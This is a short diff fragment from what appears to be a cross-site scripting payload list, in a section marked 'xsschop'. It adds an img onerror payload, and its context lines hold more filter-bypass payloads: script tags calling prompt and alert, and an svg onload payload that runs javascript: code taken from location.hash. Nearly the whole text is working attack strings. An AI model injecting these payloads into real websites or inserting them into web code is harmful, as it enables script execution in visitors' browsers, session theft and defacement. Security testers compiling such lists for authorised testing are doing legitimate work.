@@ -99,6 +99,7 @@ content['alert'](6)
  
  
  //xsschop
+ <img src=?  onerror=_=prompt,_`?` >
  <script>prompt`?`</script>
  <script>alert`/`</script>
  <svg/onload=location='javascript:/*'%2blocation.hash> #*/alert(1) 
